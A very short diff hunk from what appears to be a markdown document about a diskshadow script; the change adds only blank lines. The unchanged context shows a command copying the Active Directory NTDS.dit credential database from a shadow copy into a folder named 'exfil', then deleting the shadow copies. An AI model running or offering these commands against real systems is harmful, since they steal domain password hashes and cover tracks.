@@ -32,3 +32,5 @@ exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
 delete shadows volume %someAlias%
 reset
 ```
+
+
